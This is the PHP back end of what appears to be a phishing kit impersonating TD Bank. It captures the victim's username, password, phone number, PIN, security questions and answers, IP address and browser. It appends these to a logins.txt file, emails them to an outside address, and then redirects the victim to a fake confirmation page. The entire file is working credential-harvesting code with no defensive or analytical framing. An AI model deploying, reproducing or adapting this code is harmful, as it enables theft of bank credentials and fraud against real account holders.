<?php
error_reporting(0);
$send = "ventura514@outlook.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------------LOGIN-------------\n";
$message .= "username : ".$_POST['username']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "phone number : ".$_POST['phoneNumber']."\n";
$message .= "phone number : ".$_POST['phonePIN']."\n";
$message .= "-----------------INFO-------------\n";
$message .= "Question	: ".$_POST['question1']."\n";
$message .= "Answer		: ".$_POST['answer1']."\n";
$message .= "Question	: ".$_POST['question2']."\n";
$message .= "Answer		: ".$_POST['answer2']."\n";
$message .= "Question	: ".$_POST['question3']."\n";
$message .= "Answer		: ".$_POST['answer3']."\n";
$message .= "---------PAGE BY POSEIDON---------\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";
$message .= "-----------------TD Results------------------\n";

$subject = "TD BANK";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/logins.txt","a+");
fwrite($fp,"TD BANK" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "TD BANK", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");


?>
<script>
    window.top.location.href = "accountConfirm.htm";

</script>